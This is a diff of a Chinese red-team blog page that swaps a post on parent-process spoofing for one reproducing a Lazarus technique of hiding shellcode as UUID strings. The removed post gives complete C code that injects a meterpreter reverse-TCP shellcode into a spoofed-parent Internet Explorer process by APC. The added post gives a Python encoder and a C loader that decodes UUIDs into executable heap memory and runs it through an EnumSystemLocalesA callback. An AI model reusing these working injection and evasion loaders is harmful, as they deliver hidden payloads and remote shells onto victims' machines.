@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>父进程伪造 | 九世的博客</title>
+  <title>UID shellcode硬编码 | 九世的博客</title>
   <meta name="keywords" content=" 红队 ">
-  <meta name="description" content="父进程伪造 | 九世的博客">
+  <meta name="description" content="UID shellcode硬编码 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1598,9 +1598,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-父进程伪造" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-UID-shellcode硬编码" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">父进程伪造</h1>
+        <h1 class="article-title">UID shellcode硬编码</h1>
     
     <div class="article-meta">
         
@@ -1616,7 +1616,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2020-10-23 14:52:52">2020-10-23 14:27</time>
+        创建时间:<time class="date" title="更新时间: 2021-01-25 13:28:36">2021-01-25 13:09</time>
         
     </div>
     <div class="article-meta">
@@ -1638,7 +1638,7 @@
     
     <div class="toc-ref">
     
-        
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#复现"><span class="toc-text">复现</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1653,160 +1653,123 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <p>伪造父进程的关键点：</p>
-<pre><code>1. 寻找explorer.exe的pid，打开文件管理器的进程获取句柄 （寻找你要伪造进程的PID）
-2. 初始化指定的属性列表以创建进程和线程
-3. 设置进程属性
-</code></pre><p>关键函数主要是:</p>
-<ul>
-<li>OpenProcess</li>
-<li>InitializeProcThreadAttributeList</li>
-<li>CreateProcess</li>
-</ul>
-<p>还有个重要的结构体:STARTUPINFOEXA<br><a href="https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/ns-winbase-startupinfoexa" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/ns-winbase-startupinfoexa</a><br>STARTUPINFOEXA结构体，微软文档定义如下：</p>
-<pre><code class="c">typedef struct _STARTUPINFOEXA {
-  STARTUPINFOA                 StartupInfo;
-  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;
-} STARTUPINFOEXA, *LPSTARTUPINFOEXA;
-</code></pre>
-<p><img src="https://s1.ax1x.com/2020/10/23/BAYZFS.png" alt="参数"></p>
-<p>InitializeProcThreadAttributeList用于初始化指定的属性列表以创建进程和线程<br><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist</a></p>
-<pre><code class="c">BOOL InitializeProcThreadAttributeList(
-  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
-  DWORD                        dwAttributeCount,
-  DWORD                        dwFlags,
-  PSIZE_T                      lpSize
-);
-</code></pre>
-<p><img src="https://s1.ax1x.com/2020/10/23/BAYUSJ.png" alt="参数"></p>
-<p>父进程伪造部分代码</p>
-<pre><code class="c">STARTUPINFOEXA sInfoEX;
-PROCESS_INFORMATION pInfo;
-SIZE_T sizeT;
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>翻文章的时候翻到一篇，将shellcode硬编码成UID。然后在把UID解密写入内存空间后执行的<br>原文链接：<a href="https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/" target="_blank" rel="noopener">https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/</a></p>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>原文给出的shellcode如下</p>
+<pre><code>1\xc0PhcalcTYP@\x92t\x15Qd\x8br/\x8bv\x0c\x8bv\x0c\xad\x8b0\x8b~\x18\xb2P\xeb\x1a\xb2`H)\xd4eH\x8b2H\x8bv\x18H\x8bv\x10H\xadH\x8b0H\x8b~0\x03W&lt;\x8b\\\x17(\x8bt\x1f H\x01\xfe\x8bT\x1f$\x0f\xb7,\x17\x8dR\x02\xad\x81&lt;\x07WinEu\xef\x8bt\x1f\x1cH\x01\xfe\x8b4\xaeH\x01\xf7\x99\xff\xd7\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
+</code></pre><p>shellcode转换成UUID后和原文是对的上的</p>
+<pre><code class="py">import uuid
+import binascii
+import chardet
 
-HANDLE expHandle = OpenProcess(PROCESS_ALL_ACCESS, false, getParentProcessID()); //打开explorer进程获取当前进程所有权限
-
-ZeroMemory(&amp;sInfoEX, sizeof(STARTUPINFOEXA)); //用0填充数组
-InitializeProcThreadAttributeList(NULL, 1, 0, &amp;sizeT); //第一次设置属性的数量
-sInfoEX.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, sizeT); //设置进程属性
-InitializeProcThreadAttributeList(sInfoEX.lpAttributeList, 1, 0, &amp;sizeT);
-UpdateProcThreadAttribute(sInfoEX.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;expHandle, sizeof(HANDLE), NULL, NULL); //更新用于进程和线程创建的属性列表中的指定属性。
-sInfoEX.StartupInfo.cb = sizeof(STARTUPINFOEXA);
-CreateProcessA(&quot;C:\\Program Files\\internet explorer\\iexplore.exe&quot;, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, reinterpret_cast&lt;LPSTARTUPINFOA&gt;(&amp;sInfoEX), &amp;pInfo);
+buf=b&quot;1\xc0PhcalcTYP@\x92t\x15Qd\x8br/\x8bv\x0c\x8bv\x0c\xad\x8b0\x8b~\x18\xb2P\xeb\x1a\xb2`H)\xd4eH\x8b2H\x8bv\x18H\x8bv\x10H\xadH\x8b0H\x8b~0\x03W&lt;\x8b\\\x17(\x8bt\x1f H\x01\xfe\x8bT\x1f$\x0f\xb7,\x17\x8dR\x02\xad\x81&lt;\x07WinEu\xef\x8bt\x1f\x1cH\x01\xfe\x8b4\xaeH\x01\xf7\x99\xff\xd7\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;
+hex_buf=binascii.hexlify(buf).decode()
+tmp=&quot;&quot;
+for k in hex_buf:
+    tmp+=k
+    if len(tmp)==32:
+        print(&quot;\&quot;{}\&quot;,&quot;.format(uuid.UUID(bytes_le=binascii.unhexlify(tmp))))
+        tmp=&quot;&quot;
 </code></pre>
-<p>getParentProcessID函数用于寻找要伪造父进程pid</p>
-<pre><code class="c">DWORD getParentProcessID() { //返回explorer.exe的pid
-    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    PROCESSENTRY32 process = { 0 };
-    process.dwSize = sizeof(process);
+<p><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1gmzvadouzcj30rv07z3ze.jpg" alt=""></p>
+<p>执行shellcode</p>
+<pre><code class="C">// uuidrun.cpp : 定义控制台应用程序的入口点。
+//
 
-    if (Process32First(snapshot, &amp;process)) {
-        do {
-            //If you want to another process as parent change here
-            if (!wcscmp(process.szExeFile, L&quot;explorer.exe&quot;))
-                break;
-        } while (Process32Next(snapshot, &amp;process));
-    }
-
-    CloseHandle(snapshot);
-    return process.th32ProcessID;
-}
-</code></pre>
-<p>(使用APC的方式执行shellcode)<br>完整代码如下</p>
-<pre><code class="c">#include &quot;stdafx.h&quot;
-#include &lt;windows.h&gt;
-#include &lt;TlHelp32.h&gt;
+#include &quot;stdafx.h&quot;
+#include &lt;Windows.h&gt;
+#include &lt;Rpc.h&gt;
 #include &lt;iostream&gt;
 
-DWORD getParentProcessID() { //返回explorer.exe的pid
-    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    PROCESSENTRY32 process = { 0 };
-    process.dwSize = sizeof(process);
+#pragma comment(lib, &quot;Rpcrt4.lib&quot;)
 
-    if (Process32First(snapshot, &amp;process)) {
-        do {
-            //If you want to another process as parent change here
-            if (!wcscmp(process.szExeFile, L&quot;explorer.exe&quot;))
-                break;
-        } while (Process32Next(snapshot, &amp;process));
+const char* uuids[] =
+{
+    &quot;6850c031-6163-636c-5459-504092741551&quot;,
+    &quot;2f728b64-768b-8b0c-760c-ad8b308b7e18&quot;,
+    &quot;1aeb50b2-60b2-2948-d465-488b32488b76&quot;,
+    &quot;768b4818-4810-48ad-8b30-488b7e300357&quot;,
+    &quot;175c8b3c-8b28-1f74-2048-01fe8b541f24&quot;,
+    &quot;172cb70f-528d-ad02-813c-0757696e4575&quot;,
+    &quot;1f748bef-481c-fe01-8b34-ae4801f799ff&quot;,
+    &quot;000000d7-0000-0000-0000-000000000000&quot;,
+};
+
+int main()
+{
+    HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0); //在进程的虚拟地址空间中保留空间
+    void* ha = HeapAlloc(hc, 0, 0x100000); //申请内存
+    DWORD_PTR hptr = (DWORD_PTR)ha;
+    int elems = sizeof(uuids) / sizeof(uuids[0]);
+
+    for (int i = 0; i &lt; elems; i++) {
+        RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr); //UUID转换为原来的shellcode写入内存
+        if (status != RPC_S_OK) {
+            printf(&quot;UuidFromStringA() != S_OK\n&quot;);
+            CloseHandle(ha);
+            return -1;
+        }
+        hptr += 16;
     }
-
-    CloseHandle(snapshot);
-    return process.th32ProcessID;
-}
-
-int main() {
-
-    //Shellcode, for example; msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x EXITFUNC=thread -f c
-    unsigned char shellCode[] =
-        &quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52&quot;
-        &quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;
-        &quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;
-        &quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;
-        &quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;
-        &quot;\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b&quot;
-        &quot;\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b&quot;
-        &quot;\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41&quot;
-        &quot;\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1&quot;
-        &quot;\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45&quot;
-        &quot;\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b&quot;
-        &quot;\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01&quot;
-        &quot;\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48&quot;
-        &quot;\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9&quot;
-        &quot;\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00&quot;
-        &quot;\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5&quot;
-        &quot;\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x71\x91\x41\x54\x49\x89\xe4&quot;
-        &quot;\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68&quot;
-        &quot;\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a&quot;
-        &quot;\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89&quot;
-        &quot;\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5&quot;
-        &quot;\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba&quot;
-        &quot;\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5&quot;
-        &quot;\xe8\x93\x00\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9&quot;
-        &quot;\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5&quot;
-        &quot;\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41&quot;
-        &quot;\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41&quot;
-        &quot;\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31&quot;
-        &quot;\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8&quot;
-        &quot;\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68\x00\x40&quot;
-        &quot;\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5&quot;
-        &quot;\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c&quot;
-        &quot;\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41&quot;
-        &quot;\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5&quot;;
-
-
-
-
-    STARTUPINFOEXA sInfoEX;
-    PROCESS_INFORMATION pInfo;
-    SIZE_T sizeT;
-
-    HANDLE expHandle = OpenProcess(PROCESS_ALL_ACCESS, false, getParentProcessID()); //打开explorer进程获取当前进程所有权限
-
-    ZeroMemory(&amp;sInfoEX, sizeof(STARTUPINFOEXA)); //用0填充数组
-    InitializeProcThreadAttributeList(NULL, 1, 0, &amp;sizeT); //初始化指定的属性列表以创建进程和线程
-    sInfoEX.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, sizeT); //设置进程属性并从堆中分配内存
-    InitializeProcThreadAttributeList(sInfoEX.lpAttributeList, 1, 0, &amp;sizeT);
-    UpdateProcThreadAttribute(sInfoEX.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;expHandle, sizeof(HANDLE), NULL, NULL); //更新用于进程和线程创建的属性列表中的指定属性。
-    sInfoEX.StartupInfo.cb = sizeof(STARTUPINFOEXA);
-
-    CreateProcessA(&quot;C:\\Program Files\\internet explorer\\iexplore.exe&quot;, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, reinterpret_cast&lt;LPSTARTUPINFOA&gt;(&amp;sInfoEX), &amp;pInfo);
-
-    LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(pInfo.hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); //分配内存
-    SIZE_T *lpNumberOfBytesWritten = 0;
-    BOOL resWPM = WriteProcessMemory(pInfo.hProcess, lpBaseAddress, (LPVOID)shellCode, sizeof(shellCode), lpNumberOfBytesWritten); //写入内存
-
-    QueueUserAPC((PAPCFUNC)lpBaseAddress, pInfo.hThread, NULL); //APC调用
-    ResumeThread(pInfo.hThread); //启动线程
-    CloseHandle(pInfo.hThread); //关闭线程
-
+    printf(&quot;[*] Hexdump: &quot;);
+    for (int i = 0; i &lt; elems * 16; i++) {
+        printf(&quot;%02X &quot;, ((unsigned char*)ha)[i]);
+    }
+    EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0); //枚举操作系统上安装或支持的语言环境。
     return 0;
 }
 </code></pre>
-<p>效果如下<br><img src="https://s1.ax1x.com/2020/10/23/BANyxH.png" alt="父进程是explorer.exe"></p>
-<p><img src="https://s1.ax1x.com/2020/10/23/BANcMd.png" alt="通信"></p>
-<p><img src="https://s1.ax1x.com/2020/10/23/BANqLn.png" alt="meterpreter"></p>
-<p>参考链接:<br><a href="https://xz.aliyun.com/t/8387" target="_blank" rel="noopener">https://xz.aliyun.com/t/8387</a></p>
+<p><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1gmzvgcl40yj31560mf442.jpg" alt=""></p>
+<p>原文的shellcode反汇编后如下</p>
+<pre><code class="asm">xor eax, eax ;清空eax
+push rax
+push 0x636c6163 ;calc
+push rsp
+pop rcx
+push rax
+xchg eax, edx ;交换edx和eax的值，EAX=EDX,EDX=EAX
+je 0x24
+push rcx
+mov esi, dword ptr fs:[rdx + 0x2f] ;寻找PEB地址
+mov esi, dword ptr [rsi + 0xc]
+mov esi, dword ptr [rsi + 0xc]
+lodsd eax, dword ptr [rsi]
+mov esi, dword ptr [rax]
+mov edi, dword ptr [rsi + 0x18]
+mov dl, 0x50
+jmp 0x3e
+mov dl, 0x60
+sub rsp, rdx
+mov rsi, qword ptr gs:[rdx] ;寻找PEB地址
+mov rsi, qword ptr [rsi + 0x18]
+mov rsi, qword ptr [rsi + 0x10]
+lodsq rax, qword ptr [rsi]
+mov rsi, qword ptr [rax]
+mov rdi, qword ptr [rsi + 0x30]
+add edx, dword ptr [rdi + 0x3c]
+mov ebx, dword ptr [rdi + rdx + 0x28]
+mov esi, dword ptr [rdi + rbx + 0x20]
+add rsi, rdi
+mov edx, dword ptr [rdi + rbx + 0x24]
+movzx ebp, word ptr [rdi + rdx]
+lea edx, [rdx + 2]
+lodsd eax, dword ptr [rsi]
+cmp dword ptr [rdi + rax], 0x456e6957
+jne 0x50
+mov esi, dword ptr [rdi + rbx + 0x1c]
+add rsi, rdi
+mov esi, dword ptr [rsi + rbp*4]
+add rdi, rsi
+cdq 
+call rdi
+add byte ptr [rax], al
+add byte ptr [rax], al
+add byte ptr [rax], al
+add byte ptr [rax], al
+add byte ptr [rax], al
+add byte ptr [rax], al
+add byte ptr [rax], al
+</code></pre>
+<p>尝试用msf的shellcode来整UUID。发现并不行，估计shellcode需要修改，不会改，算篇复现文…</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1816,12 +1779,12 @@ int main() {
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>父进程伪造</p>
+    <p><span class="copy-title">文章标题:</span>UID shellcode硬编码</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2020-10-23, 14:27:16</p>
-    <p><span class="copy-title">最后更新:</span>2020-10-23, 14:52:52</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/d0aae8a6.html" title="父进程伪造">http://422926799.github.io/posts/d0aae8a6.html</a>
+    <p><span class="copy-title">发布时间:</span>2021-01-25, 13:09:49</p>
+    <p><span class="copy-title">最后更新:</span>2021-01-25, 13:28:36</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/9f6e42ac.html" title="UID shellcode硬编码">http://422926799.github.io/posts/9f6e42ac.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
